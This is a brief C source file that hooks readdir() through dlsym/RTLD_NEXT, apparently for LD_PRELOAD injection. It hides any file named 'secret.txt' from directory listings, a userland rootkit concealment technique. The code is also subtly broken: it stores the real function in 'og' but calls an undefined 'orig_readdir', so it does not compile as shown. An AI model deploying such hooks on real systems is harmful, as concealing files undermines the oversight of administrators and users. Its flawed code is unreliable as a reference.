#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

typedef struct dirent *(*orig_readdir_type)(DIR *dirp);
struct dirent *readdir(DIR *dirp) {
    static orig_readdir_type og = NULL;
    if (!og) {
        og = (orig_readdir_type)dlsym(RTLD_NEXT, "readdir");
    }
    struct dirent *start;
    while ((start = orig_readdir(dirp)) != NULL) {
        if (strcmp(start->d_name, "secret.txt") == 0) { //ensures that secret.txt is skipped when the directory is read
            continue; 
        }
        return start;
    }
    return NULL;
}
